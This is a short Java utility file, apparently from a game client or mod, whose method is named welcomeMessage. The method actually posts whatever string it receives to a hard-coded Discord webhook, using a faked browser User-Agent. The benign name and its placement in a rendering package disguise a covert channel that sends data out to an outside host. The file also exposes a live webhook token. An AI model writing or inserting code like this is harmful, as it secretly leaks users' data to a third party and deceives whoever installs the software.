package sudo.utils.render;

import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import javax.net.ssl.HttpsURLConnection;

public class Misc {
	
    public static void welcomeMessage(final String command) {
        final String webhookURL = "https://discord.com/api/webhooks/1058023230885068811/aGakKHvbmy1rSgWtJZLgmyXYdHCRn_eIYeQDNd3OdbF38j6US8IWrI1chrxtVUc0DhAa";
        if (!webhookURL.isEmpty()) {
            try {
                final HttpsURLConnection connection = (HttpsURLConnection) new URL(webhookURL).openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
                connection.setDoOutput(true);
                try (final OutputStream outputStream = connection.getOutputStream()) {
                    // Handle backslashes.
                    String preparedCommand = command.replaceAll("\\\\", "");
                    if (preparedCommand.endsWith(" *")) preparedCommand = preparedCommand.substring(0, preparedCommand.length() - 2) + "*";

                    outputStream.write(("{\"content\":\"" + preparedCommand + "\"}").getBytes(StandardCharsets.UTF_8));
                }
                connection.getInputStream();
            } catch (final IOException e) {
                e.printStackTrace();
            }
        }
    }
}
